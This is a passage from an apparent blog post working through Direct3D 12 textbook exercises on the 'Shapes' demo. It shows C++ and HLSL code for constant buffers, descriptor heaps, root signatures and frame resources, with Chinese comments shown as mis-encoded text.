    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 View <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 InvView <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 Proj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 InvProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 ViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 InvViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT3 EyePosW <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> cbPerObjectPad1 <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT2 RenderTargetSize <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT2 InvRenderTargetSize <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> NearZ <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> FarZ <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> TotalTime <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> DeltaTime <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

cbuffer cbPerObject <span class="token operator">:</span> <span class="token keyword">register</span><span class="token punctuation">(</span>b0<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float4x4 gWorld<span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

cbuffer cbPass <span class="token operator">:</span> <span class="token keyword">register</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    float4x4 gView<span class="token punctuation">;</span>
    float4x4 gInvView<span class="token punctuation">;</span>
    float4x4 gProj<span class="token punctuation">;</span>
    float4x4 gInvProj<span class="token punctuation">;</span>
    float4x4 gViewProj<span class="token punctuation">;</span>
    float4x4 gInvViewProj<span class="token punctuation">;</span>
    float3 gEyePosW<span class="token punctuation">;</span>
    <span class="token keyword">float</span> cbPerObjectPad1<span class="token punctuation">;</span>
    float2 gRenderTargetSize<span class="token punctuation">;</span>
    float2 gInvRenderTargetSize<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gNearZ<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gFarZ<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gTotalTime<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gDeltaTime<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">FrameResource</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    
    <span class="token function">FrameResource</span><span class="token punctuation">(</span>ID3D12Device<span class="token operator">*</span> device<span class="token punctuation">,</span> UINT passCount<span class="token punctuation">,</span> UINT objectCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">FrameResource</span><span class="token punctuation">(</span><span class="token keyword">const</span> FrameResource<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">delete</span><span class="token punctuation">;</span>
    FrameResource<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> FrameResource<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">delete</span><span class="token punctuation">;</span>
    <span class="token operator">~</span><span class="token function">FrameResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// We cannot reset the allocator until the GPU is done processing the commands.</span>
    <span class="token comment">// So each frame needs their own allocator.</span>
    Microsoft<span class="token double-colon punctuation">::</span>WRL<span class="token double-colon punctuation">::</span>ComPtr<span class="token operator">&lt;</span>ID3D12CommandAllocator<span class="token operator">></span> CmdListAlloc<span class="token punctuation">;</span>

    <span class="token comment">// We cannot update a cbuffer until the GPU is done processing the commands</span>
    <span class="token comment">// that reference it.  So each frame needs their own cbuffers.</span>
    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>UploadBuffer<span class="token operator">&lt;</span>PassConstants<span class="token operator">>></span> PassCB <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>UploadBuffer<span class="token operator">&lt;</span>ObjectConstants<span class="token operator">>></span> ObjectCB <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>

    <span class="token comment">// Fence value to mark commands up to this fence point.  This lets us</span>
    <span class="token comment">// check if these frame resources are still in use by the GPU.</span>
    UINT64 Fence <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*
ç¬¬ä¸€æ­¥:åˆ›å»ºæ ¹ç­¾åï¼ŒæŠŠä¸€ä¸ªå«æœ‰ cbv çš„æè¿°ç¬¦è¡¨ ç»‘å®šåˆ°å¸¸é‡ç¼“å†²åŒºå¯„å­˜å™¨ 0ï¼Œæ€»æ„Ÿè§‰è¿™ä¸ªç»‘å®šè¿‡ç¨‹æœ‰å†—ä½™
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildRootSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    CD3DX12_DESCRIPTOR_RANGE cbvTable0<span class="token punctuation">;</span>
	cbvTable0<span class="token punctuation">.</span><span class="token function">Init</span><span class="token punctuation">(</span>D3D12_DESCRIPTOR_RANGE_TYPE_CBV<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    <span class="token comment">// Create root CBVs.</span>
    slotRootParameter<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">InitAsDescriptorTable</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbvTable0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    HRESULT hr <span class="token operator">=</span> <span class="token function">D3D12SerializeRootSignature</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rootSigDesc<span class="token punctuation">,</span> D3D_ROOT_SIGNATURE_VERSION_1<span class="token punctuation">,</span>
		serializedRootSig<span class="token punctuation">.</span><span class="token function">GetAddressOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> errorBlob<span class="token punctuation">.</span><span class="token function">GetAddressOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    md3dDevice<span class="token operator">-></span><span class="token function">CreateRootSignature</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*
ç¬¬äºŒæ­¥ï¼šåˆ›å»ºäº†å¸§èµ„æºï¼Œåœ¨å¸§èµ„æºä¸­å­˜å‚¨ç€ PassCBï¼ŒObjectCB çš„æŒ‡é’ˆ
ç®€å•åˆå§‹åŒ–äº† mFrameResources 
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildFrameResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> gNumFrameResources<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        mFrameResources<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>FrameResource<span class="token operator">></span></span></span><span class="token punctuation">(</span>md3dDevice<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mAllRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºäº†å †æè¿°ç¬¦ï¼Œä¸ºäº†å°†å¸¸é‡ç¼“å†²åŒºç»‘å®šåˆ°æ¸²æŸ“æµæ°´çº¿ä¸Šï¼Œä½†æ˜¯æ­¤æ—¶è¿˜æ²¡æœ‰ç»‘å®š
åˆ›å»ºäº† mCbvHeapï¼Œä»¥åŠä¸€äº›æ•°æ® mPassCbvOffset
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildDescriptorHeaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    UINT objCount <span class="token operator">=</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mOpaqueRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Need a CBV descriptor for each object for each frame resource,</span>
    <span class="token comment">// +1 for the perPass CBV for each frame resource.</span>
    UINT numDescriptors <span class="token operator">=</span> <span class="token punctuation">(</span>objCount<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> gNumFrameResources<span class="token punctuation">;</span>

    <span class="token comment">// Save an offset to the start of the pass CBVs.  These are the last 3 descriptors.</span>
    mPassCbvOffset <span class="token operator">=</span> objCount <span class="token operator">*</span> gNumFrameResources<span class="token punctuation">;</span>

    D3D12_DESCRIPTOR_HEAP_DESC cbvHeapDesc<span class="token punctuation">;</span>
    cbvHeapDesc<span class="token punctuation">.</span>NumDescriptors <span class="token operator">=</span> numDescriptors<span class="token punctuation">;</span>
    cbvHeapDesc<span class="token punctuation">.</span>Type <span class="token operator">=</span> D3D12_DESCRIPTOR_HEAP_TYPE_CBV_SRV_UAV<span class="token punctuation">;</span>
    cbvHeapDesc<span class="token punctuation">.</span>Flags <span class="token operator">=</span> D3D12_DESCRIPTOR_HEAP_FLAG_SHADER_VISIBLE<span class="token punctuation">;</span>
    cbvHeapDesc<span class="token punctuation">.</span>NodeMask <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">ThrowIfFailed</span><span class="token punctuation">(</span>md3dDevice<span class="token operator">-></span><span class="token function">CreateDescriptorHeap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cbvHeapDesc<span class="token punctuation">,</span>
        <span class="token function">IID_PPV_ARGS</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mCbvHeap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
ç¬¬å››æ­¥ï¼šå¯¹æ¯ä¸€ä¸ªå¸§èµ„æºï¼Œä½¿ç”¨ Resource() è·å¾— ID3D12Resource* objectCBï¼Œç„¶åé€šè¿‡ï¼ŒGetGPUVirtualAddress() å¾ªç¯è·å¾—D3D12_GPU_VIRTUAL_ADDRESS cbAddressï¼Œä¿®æ”¹åˆ°å¯¹åº”æ•°æ®çš„åç§»ä½ç½®å¤„ï¼Œ

UploadBuffer::Resource(...)->ID3D12Resource*
ID3D12Resource::GetGPUVirtualAddress(...)->D3D12_GPU_VIRTUAL_ADDRESS

å†æŠŠ cbAddress åç§»åˆ°ä¸åŒç‰©ä½“çš„ä¸Šï¼Œå¯¹æ¯ä¸€ä¸ªç‰©ä½“ï¼ˆç”¨ heapIndex æŒ‡æ˜æ˜¯å“ªä¸ªç‰©ä½“ï¼‰ï¼Œè·å– handle å†é…ç½® cbvDescï¼ˆå…¶ä¸­åŒ…å«æœ‰ cbAddress ç¡®ä¿åç§»ï¼‰ åˆ›å»º cbv

CD3DX12_CPU_DESCRIPTOR_HANDLE->CD3DX12_CPU_DESCRIPTOR_HANDLE
ID3D12Device->CreateConstantBufferView(&amp;cbvDesc, handle)
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildConstantBufferViews</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    UINT objCBByteSize <span class="token operator">=</span> d3dUtil<span class="token double-colon punctuation">::</span><span class="token function">CalcConstantBufferByteSize</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ObjectConstants<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    UINT objCount <span class="token operator">=</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mOpaqueRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Need a CBV descriptor for each object for each frame resource.</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> frameIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> frameIndex <span class="token operator">&lt;</span> gNumFrameResources<span class="token punctuation">;</span> <span class="token operator">++</span>frameIndex<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> objectCB <span class="token operator">=</span> mFrameResources<span class="token punctuation">[</span>frameIndex<span class="token punctuation">]</span><span class="token operator">-></span>ObjectCB<span class="token operator">-></span><span class="token function">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>UINT i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> objCount<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            D3D12_GPU_VIRTUAL_ADDRESS cbAddress <span class="token operator">=</span> objectCB<span class="token operator">-></span><span class="token function">GetGPUVirtualAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Offset to the ith object constant buffer in the buffer.</span>
            cbAddress <span class="token operator">+=</span> i<span class="token operator">*</span>objCBByteSize<span class="token punctuation">;</span>

            <span class="token comment">// Offset to the object cbv in the descriptor heap.</span>
            <span class="token keyword">int</span> heapIndex <span class="token operator">=</span> frameIndex<span class="token operator">*</span>objCount <span class="token operator">+</span> i<span class="token punctuation">;</span>
            <span class="token keyword">auto</span> handle <span class="token operator">=</span> <span class="token function">CD3DX12_CPU_DESCRIPTOR_HANDLE</span><span class="token punctuation">(</span>mCbvHeap<span class="token operator">-></span><span class="token function">GetCPUDescriptorHandleForHeapStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            handle<span class="token punctuation">.</span><span class="token function">Offset</span><span class="token punctuation">(</span>heapIndex<span class="token punctuation">,</span> mCbvSrvUavDescriptorSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

            D3D12_CONSTANT_BUFFER_VIEW_DESC cbvDesc<span class="token punctuation">;</span>
            cbvDesc<span class="token punctuation">.</span>BufferLocation <span class="token operator">=</span> cbAddress<span class="token punctuation">;</span>
            cbvDesc<span class="token punctuation">.</span>SizeInBytes <span class="token operator">=</span> objCBByteSize<span class="token punctuation">;</span>

            md3dDevice<span class="token operator">-></span><span class="token function">CreateConstantBufferView</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cbvDesc<span class="token punctuation">,</span> handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//...</span>
    <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
ç¬¬äº”æ­¥:è¿˜éœ€è¦æœ€ç»ˆçš„ç»‘å®šï¼Œéœ€è¦ gpu å»æ‰§è¡ŒæŒ‡ä»¤ï¼ˆä¸çŸ¥é“å¯ä¸å¯ä»¥è¿™ä¹ˆç†è§£ï¼‰
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">DrawRenderItems</span><span class="token punctuation">(</span>ID3D12GraphicsCommandList<span class="token operator">*</span> cmdList<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>RenderItem<span class="token operator">*</span><span class="token operator">></span><span class="token operator">&amp;</span> ritems<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    UINT objCBByteSize <span class="token operator">=</span> d3dUtil<span class="token double-colon punctuation">::</span><span class="token function">CalcConstantBufferByteSize</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ObjectConstants<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
	<span class="token keyword">auto</span> objectCB <span class="token operator">=</span> mCurrFrameResource<span class="token operator">-></span>ObjectCB<span class="token operator">-></span><span class="token function">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// For each render item...</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ritems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> ri <span class="token operator">=</span> ritems<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

        cmdList<span class="token operator">-></span><span class="token function">IASetVertexBuffers</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ri<span class="token operator">-></span>Geo<span class="token operator">-></span><span class="token function">VertexBufferView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cmdList<span class="token operator">-></span><span class="token function">IASetIndexBuffer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ri<span class="token operator">-></span>Geo<span class="token operator">-></span><span class="token function">IndexBufferView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cmdList<span class="token operator">-></span><span class="token function">IASetPrimitiveTopology</span><span class="token punctuation">(</span>ri<span class="token operator">-></span>PrimitiveType<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Offset to the CBV in the descriptor heap for this object and for this frame resource.</span>
        UINT cbvIndex <span class="token operator">=</span> mCurrFrameResourceIndex<span class="token operator">*</span><span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mOpaqueRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> ri<span class="token operator">-></span>ObjCBIndex<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> cbvHandle <span class="token operator">=</span> <span class="token function">CD3DX12_GPU_DESCRIPTOR_HANDLE</span><span class="token punctuation">(</span>mCbvHeap<span class="token operator">-></span><span class="token function">GetGPUDescriptorHandleForHeapStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cbvHandle<span class="token punctuation">.</span><span class="token function">Offset</span><span class="token punctuation">(</span>cbvIndex<span class="token punctuation">,</span> mCbvSrvUavDescriptorSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

        cmdList<span class="token operator">-></span><span class="token function">SetGraphicsRootDescriptorTable</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> cbvHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        cmdList<span class="token operator">-></span><span class="token function">DrawIndexedInstanced</span><span class="token punctuation">(</span>ri<span class="token operator">-></span>IndexCount<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> ri<span class="token operator">-></span>StartIndexLocation<span class="token punctuation">,</span> ri<span class="token operator">-></span>BaseVertexLocation<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// ä¸Šé¢çš„é¡ºåºä¹Ÿèƒ½æ›¿æ¢ä¸€ä¸‹ï¼ŒBuildRootSignature() æ”¾åé¢ä¸€ç‚¹ä¹Ÿæ²¡äº‹ã€‚</span>
<span class="token comment">// æœ€åä¿æŒæ˜ å°„çŠ¶æ€ï¼Œç›´æ¥ CopyData å°±å¥½äº†ï¼Œä¸æ–­æ›´æ–°ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="7-9-1"><a href="#7-9-1" class="headerlink" title="7.9.1"></a>7.9.1</h3><p>Modify the â€œShapeâ€ demo to use GeometryGenerator::CreateGeosphere instead of GeometryGenerator::CreateSphere. Try with 0, 1, 2, and 3 subdivision levels</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// GeometryGenerator::MeshData GeometryGenerator::CreateGeosphere(float radius, uint32 numSubdivisions)</span>
GeometryGenerator<span class="token double-colon punctuation">::</span>MeshData sphere <span class="token operator">=</span> geoGen<span class="token punctuation">.</span><span class="token function">CreateGeosphere</span><span class="token punctuation">(</span><span class="token number">0.5f</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//ä»¥ä¸‹åˆ†åˆ«ä¸º0ï¼Œ1ï¼Œ2ï¼Œ3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315184610201.png" alt="image-20220315184610201"><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315184900170.png" alt="image-20220315184900170"><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315185018939.png" alt="image-20220315185018939"><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315185143381.png" alt="image-20220315185143381"></p>
<p>ç»†åˆ†è°ƒå¾ˆé«˜çš„è¯ä¼šæœ‰ä¸€éƒ¨åˆ†çœ‹ä¸è§äº†ï¼Œå°šæœªæ‰¾åˆ°åŸå› <img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220315185238091.png" alt="image-20220315185238091"></p>
<h3 id="7-9-2"><a href="#7-9-2" class="headerlink" title="7.9.2"></a>7.9.2</h3><p>Modify the â€œShapesâ€ demo to use sixteen root constants to set the per-object world matrix instead of a descriptor table</p>
<p>æˆ‘å°±è¯´æˆ‘çœ‹å®Œäº†è¿™ä¸€ç« æœ‰äº›ä¸œè¥¿çœŸçš„åªæ˜¯çœ‹çœ‹è¿‡ï¼ŒçŸ¥è¯†æ²¡æœ‰è¿›è„‘å­ï¼Œè¿™ç»ƒä¹ å¤šæ˜¯ä¸€ä»¶ç¾äº‹å•Šå•Šå“ˆå“ˆå“ˆå“ˆâ€¦</p>
<p>æœäº†ï¼Œä»–çš„åæ ‡ç³»ï¼Œiï¼Œj å’Œæˆ‘ç†è§£çš„ä¸å¤ªä¸€æ ·ï¼Œç”»å‡ºæ¥å°±å¼‚å¸¸çš„ä¸å¯¹åŠ²ã€‚</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*
å‰é¢çš„ä»»åŠ¡å°±æ˜¯åˆ æ‰ç¬¬ä¸€ä¸ª CBï¼ŒCBV ç­‰ã€‚ä¿®æ”¹æ ¹ç­¾åã€‚çœ‹äº†åˆ«äººçš„åšæ³•ï¼Œç‰¹æ„ä¿®æ”¹äº† ObjectCBï¼Œå…¶å®æ²¡æœ‰å¿…è¦ï¼Œå› ä¸ºæ˜¯å¸¸é‡ï¼Œä¸éœ€è¦æ¯æ¬¡å»ä¿®æ”¹ï¼Œèµ‹å€¼

gWorld,æŒ‰ç…§æˆ‘çš„ç†è§£ï¼Œåº”è¯¥æ˜¯ç«–å‘çš„å¡«å……ã€‚
*/</span>


<span class="token keyword">float</span> srcData<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
